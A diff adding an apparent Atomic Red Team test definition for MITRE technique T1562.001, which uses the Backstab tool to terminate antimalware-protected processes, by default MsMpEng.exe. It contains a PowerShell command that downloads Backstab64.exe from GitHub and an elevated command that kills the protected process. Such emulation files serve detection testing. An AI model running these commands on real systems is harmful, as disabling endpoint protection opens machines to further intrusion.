@@ -1,0 +1,37 @@
+{
+    "name": "Kill antimalware protected processes using Backstab",
+    "description": "Backstab loads Process Explorer driver which is signed by Microsoft and use it to terminate running processes protected by antimalware software such as MsSense.exe or MsMpEng.exe, which is otherwise not possible to kill. https://github.com/Yaxser/Backstab",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "& \"PathToAtomicsFolder\\..\\ExternalPayloads\\Backstab64.exe\" -k -n #{process_name}\n",
+        "name": "powershell",
+        "elevation_required": true,
+        "type": "Command Executor"
+    },
+    "id": "T1562.001",
+    "tactics": [
+        "Defense Evasion"
+    ],
+    "technique": "Disable or Modify Tools",
+    "source": "ART",
+    "uuid": "24a12b91-05a7-4deb-8d7f-035fa98591bc",
+    "arguments": {
+        "process_name": {
+            "description": "Name of the protected process you want to kill/terminate.",
+            "type": "string",
+            "default": "MsMpEng.exe"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "Backstab64.exe should exist in ExtrnalPayloads Directory",
+            "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Backstab64.exe\") {exit 0} else {exit 1}",
+            "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/Yaxser/Backstab/releases/download/v1.0.1-beta/Backstab64.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\Backstab64.exe\"\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
